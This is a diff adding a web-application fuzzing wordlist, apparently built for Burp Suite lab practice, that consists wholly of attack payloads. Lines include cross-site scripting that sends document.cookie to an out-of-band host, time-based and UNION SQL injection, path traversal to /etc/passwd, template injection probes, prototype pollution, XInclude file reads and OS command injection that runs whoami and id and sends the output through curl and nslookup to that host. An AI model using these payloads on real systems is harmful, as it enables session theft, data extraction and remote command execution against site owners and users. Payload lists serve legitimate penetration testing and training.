@@ -1,0 +1,153 @@
+OASTIFY.XXX
+fuzzers
+https://OASTIFY.XXX?j=b
+'"><svg/onload=fetch(`//OASTIFY.XXX/${encodeURIComponent(document.cookie)}`)>:CURRENT-USER-LOGIN-COOKIE-2ND-PART
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
+<>\'\"<script>{{7*7}}
+$(alert(1)}"-prompt(69)-"fuzzer
+}"-prompt(69)-"fuzzer
+{{$on.constructor('alert(1)')()}}
+/product?productId=1&storeId=fuzzer"></select>fuzzer
+fuzzer"></select>fuzzer
+#x=y&
+&x=y#
+?x=y
+'
+"
+""
+''
+}}
+#
+%
+&
+?
+';
+''-
+--
+<iframe src="https://OASTIFY.XXX/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.XXX?collector=`+btoa(document.cookie))>','*')">
+<img src=1 onerror=alert(1)>
+"><svg><animatetransform onbegin=alert(1)>
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
+%22%3E%3Cbody%20onpopstate=print()%3E">
+%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+?search=%22%3E%3Cbody%20onpopstate=print()>
+\'-alert(1)//  
+fuzzer\';console.log(12345);//  
+fuzzer\';alert(`backtick typographical`);//
+\';document.location=`https://OASTIFY.XXX/?BackTicks=`+document.cookie;//
+${alert(document.cookie)}
+<img src="https://OASTIFY.XXX/img">
+<script src="https://OASTIFY.XXX/script"></script>
+<video src="https://OASTIFY.XXX/video"></video>
+<base href="https://OASTIFY.XXX">
+alert(document.getElementsByClassName("navbar-brand")[0].innerText)
+?callback=setCountryCookie&utm_content=fuzzer;callback=EVILFunction
+document.location='https://OASTIFY.XXX/?CacheCookies='+document.cookie;
+?cb=123
+cachebuster=123456789
+ "/><script>alert(1)</script>
+ a"/><script>document.location='http://OASTIFY.XXX/?cookiestealer='+document.cookie;</script>
+very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-strings@dontwannacry.com.exploit-0afe007b03a34169c10b8fc501510091.OASTIFY.XXX
+<iframe src="https://OASTIFY.XXX/oauth-linking?code=STOLEN-CODE"></iframe>
+hacker@exploit
+hacker@exploit.
+hacker@exploit.com
+/?search=test%0d%0aSet-Cookie:%20csrfKey=CurrentUserCSRFKEY%3b%20SameSite=None
+%0d%0a
+%0d
+%0a
+%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E&password=pass
+%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
+;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
+' AND '1'='1
+' AND '1'='2
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+../../../../../../../dev/null
+https://OASTIFY.XXX/#__proto__[hitCallback]=alert%28document.cookie%29
+#__proto__[hitCallback]=alert%28document.cookie%29
+"__proto__": {"foo":"bar"}
+%26x=y
+0
+1
+7
+69
+99
+100
+/admin
+/portal
+/secrets
+/fuzzer
+{"data": {"__typename": "query"}}
+__schema
+/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+%0a
+127.0.0.1
+2130706433
+017700000001
+127.1
+%2561
+<div><p>ReportFuzzer<img src="https://OASTIFY.XXX/fuzz.png"></p>
+${{<%[%'"}}%\.,
+}}{{7*7}} 
+{{fuzzer}}
+${fuzzer}
+${{fuzzer}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+${foobar}
+{% debug %}
+fuzzer%20this%20product%20is%20out%20of%20 --os-cmd "cat /etc/proc"
+{{7*7}}
+7*7
+fuzzer${{<%[%'"}}%\<>
+<%= 7*7 %>
+fuzzer${{<%[%'"}}%\,<>
+/etc/passwd
+/etc/hostname
+....//....//....//....//etc/hostname
+..%252f..%252f..%252fetc/passwd
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png
+../../../../../../../../../../etc/hostname
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname
+../
+..\
+..\..\..\windows\win.ini
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname
+ &&
+ &
+ ||
+ |
+ ;
+ `
+ '
+ "
+ 0x0a
+ \n
+||curl OASTIFY.XXX||
+||curl+`whoami`.OASTIFY.XXX||
+||curl+`id`.OASTIFY.XXX||
+||nslookup+`whoami`.OASTIFY.XXX||
+||nslookup+`id`.OASTIFY.XXX||
+||pwd>output.txt||
+||echo>>output.txt||
+||cat+/etc/hosts>>/var/www/images/output.txt||
+||echo>>output.txt||
+||ls+-al>>/var/www/images/output.txt||
+||echo>>output.txt||
+||whoami>>/var/www/images/output.txt||
+CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
+<a href="javascript:&bsol;u0061lert(1)">Click me</a>
+<img src=x onerror="&#x61;lert(1)">
+/?x=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+%26entity;
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>
+<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/hostname"/></foo>
+<xxx>1 UNION SELECT NULL</xxx>
+fuzzer
